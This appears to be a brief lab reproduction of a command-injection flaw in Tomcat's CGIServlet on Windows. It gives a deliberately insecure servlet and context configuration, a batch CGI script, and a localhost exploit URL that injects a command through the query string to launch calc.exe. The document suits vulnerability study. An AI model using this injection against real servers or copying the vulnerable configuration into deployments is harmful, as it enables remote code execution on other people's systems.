### Testing Environment:
```
Tomcat 8.5.39
JDK 8u121
```

### Modify Configuration

#### web.xml

```
<servlet>
        <servlet-name>cgi</servlet-name>
        <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
        <init-param>
          <param-name>debug</param-name>
          <param-value>0</param-value>
        </init-param>
        <init-param>
          <param-name>cgiPathPrefix</param-name>
          <param-value>WEB-INF/cgi-bin</param-value>
        </init-param>
        <init-param>
          <param-name>executable</param-name>
          <param-value></param-value>
        </init-param>
         <load-on-startup>5</load-on-startup>
</servlet> 
```

#### content.xml

```
<Context privileged="true">

    <!-- Default set of monitored resources. If one of these changes, the    -->
    <!-- web application will be reloaded.                                   -->
    <WatchedResource>WEB-INF/web.xml</WatchedResource>
    <WatchedResource>${catalina.base}/conf/web.xml</WatchedResource>

    <!-- Uncomment this to disable session persistence across Tomcat restarts -->
    <!--
    <Manager pathname="" />
    -->
</Context>
```

#### hello.bat
```
echo Content-type: text/html
```

### Move `WEB-INF` to $CATALINA_HOME/webapps/ROOT  and start TOMCAT server

### Visit the URL and inject OS command
```
http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe
```
